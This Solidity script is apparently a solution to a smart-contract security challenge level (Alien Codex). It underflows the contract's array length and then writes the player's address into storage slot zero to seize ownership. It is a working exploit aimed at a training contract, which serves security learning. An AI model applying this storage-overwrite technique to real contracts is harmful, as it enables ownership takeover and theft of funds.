// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IAlienCodex.sol";

contract SolveLevel19 is SolveLevelBase {
    using stdStorage for StdStorage;

    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xcAac6e4994c2e21C5370528221c226D1076CfDAB;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IAlienCodex instance = IAlienCodex(instanceAddress);

        instance.make_contact();
        instance.retract();

        bytes32 dataForSlotZero = bytes32(
            bytes.concat(bytes12(uint96(1)), bytes20(player))
        );
        uint256 codexStartSlot = stdstore
            .target(instanceAddress)
            .sig("codex(uint256)")
            .with_key(uint256(0))
            .find();

        logStuff(instance, dataForSlotZero);

        instance.revise(
            type(uint256).max - codexStartSlot + 1,
            dataForSlotZero
        );
    }

    function logStuff(IAlienCodex instance, bytes32 dataForSlotZero) public {
        console.log("owner");
        console.log(instance.owner());
        for (uint256 slot = 0; slot < 4; slot++) {
            console.log("slot", slot);
            console.logBytes32(
                vm.load(address(instance), bytes32(uint256(slot)))
            );
        }
        console.log("dataForSlotZero");
        console.logBytes32(dataForSlotZero);
    }
}
